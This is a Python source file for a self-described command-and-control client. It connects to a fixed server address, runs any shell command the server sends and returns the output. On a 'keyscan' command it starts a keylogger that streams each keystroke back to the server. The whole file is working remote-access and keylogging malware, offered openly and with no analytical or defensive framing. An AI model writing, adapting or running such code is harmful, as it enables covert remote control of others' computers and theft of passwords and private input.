#!/usr/bin/env python3
"""
Command and Control (C2C) Client
Connects to server, executes commands, and sends output back.
Includes keylogger functionality when requested.
"""

import socket
import threading
import time
import subprocess
import sys
import os
from pynput import keyboard

# Server configuration
SERVER_HOST = "192.168.1.2"
SERVER_PORT = 1234

# Global variables
keylogger_active = False
keylogger_thread = None
current_socket = None

def tcp_connect(host, port):
    """
    Establish a TCP connection to the specified host and port.
    
    Args:
        host (str): The server hostname or IP address
        port (int): The server port number
    
    Returns:
        socket: Connected socket object, or None if connection failed
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"[Error]: Failed to connect to {host}:{port} - {e}")
        return None

def send_limited_response(sock, response, word_limit=20):
    """
    Send only the first 20 words of the response to server.
    
    Args:
        sock (socket): The connected socket
        response (str): The full response to send
        word_limit (int): Maximum number of words to send (default: 20)
    """
    words = response.split()
    
    # Take only the first 20 words
    limited_words = words[:word_limit]
    limited_response = ' '.join(limited_words)
    
    try:
        sock.send(limited_response.encode('utf-8'))
        print(f"[Sent to Server]: {limited_response}")
        print(f"[Word Count]: {len(limited_words)} words sent")
    except Exception as send_error:
        print(f"[Error]: Failed to send response: {send_error}")

def execute_command(command):
    """
    Execute a system command and return the output.
    
    Args:
        command (str): The command to execute
    
    Returns:
        str: Command output or error message
    """
    try:
        # Execute the command and capture output
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30  # 30 second timeout
        )
        
        # Combine stdout and stderr
        output = result.stdout
        if result.stderr:
            output += f"\nError: {result.stderr}"
        
        if not output.strip():
            output = f"Command executed successfully (no output)"
        
        return output
        
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Failed to execute command: {e}"

def on_key_press(key):
    """
    Callback function for keylogger - captures key presses.
    
    Args:
        key: The pressed key
    """
    global current_socket, keylogger_active
    
    if not keylogger_active or not current_socket:
        return
    
    try:
        # Format the key for sending
        if hasattr(key, 'char') and key.char is not None:
            key_data = f"{key.char}"
        else:
            key_data = f"{str(key)}"
        
        # Send key data to server
        send_limited_response(current_socket, key_data)
        print(f"[Keylogger]: {key_data}")
        
    except Exception as e:
        print(f"[Keylogger Error]: {e}")

def start_keylogger():
    """
    Start the keylogger in a separate thread.
    """
    global keylogger_active, keylogger_thread
    
    if keylogger_active:
        print("[Keylogger]: Already running")
        return
    
    keylogger_active = True
    print("[Keylogger]: Starting keylogger...")
    
    # Start keyboard listener
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    
    print("[Keylogger]: Keylogger active - logging all keystrokes")

def stop_keylogger():
    """
    Stop the keylogger.
    """
    global keylogger_active
    
    if not keylogger_active:
        print("[Keylogger]: Not running")
        return
    
    keylogger_active = False
    print("[Keylogger]: Stopped")

def listen_for_commands(sock):
    """
    Continuously listen for commands from the server.
    
    Args:
        sock (socket): The connected socket
    """
    global current_socket
    current_socket = sock
    
    while True:
        try:
            # Receive command from server
            data = sock.recv(1024)
            if not data:
                print("[Info]: Server closed the connection")
                break
            
            # Decode the command
            command = data.decode('utf-8').strip()
            print(f"\n[Server Command]: {command}")
            
            # Handle special commands
            if command.lower() == "keyscan":
                start_keylogger()
                response = "Keylogger started - logging all keystrokes"
            elif command.lower() == "stopkeyscan":
                stop_keylogger()
                response = "Keylogger stopped"
            else:
                # Execute regular system command
                print("[Executing]: Running command...")
                response = execute_command(command)
            
            # Send response back to server
            print(f"[Command Output]: {response}")
            print("[Sending]: Limiting response to 20 words...")
            send_limited_response(sock, response)
            
        except socket.timeout:
            continue
        except Exception as e:
            print(f"\n[Error]: Error receiving command: {e}")
            break

def main():
    """
    Main function to establish connection and start command listener.
    """
    print("C2C Client - Command and Control System")
    print("=" * 50)
    
    # Connect to server
    print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
    sock = tcp_connect(SERVER_HOST, SERVER_PORT)
    
    if not sock:
        print("Failed to establish connection. Exiting.")
        return
    
    print(f"Successfully connected to {SERVER_HOST}:{SERVER_PORT}")
    print("C2C Client ready - waiting for commands from server...")
    print("Server can send:")
    print("- 'keyscan' to start keylogger")
    print("- 'stopkeyscan' to stop keylogger") 
    print("- Any system command to execute")
    print("-" * 50)
    
    # Set socket timeout for non-blocking receive
    sock.settimeout(1.0)
    
    try:
        # Start listening for commands
        listen_for_commands(sock)
    except KeyboardInterrupt:
        print("\n[Info]: Shutting down C2C client...")
    finally:
        # Cleanup
        stop_keylogger()
        sock.close()
        print("[Info]: Connection closed")

if __name__ == "__main__":
    main()
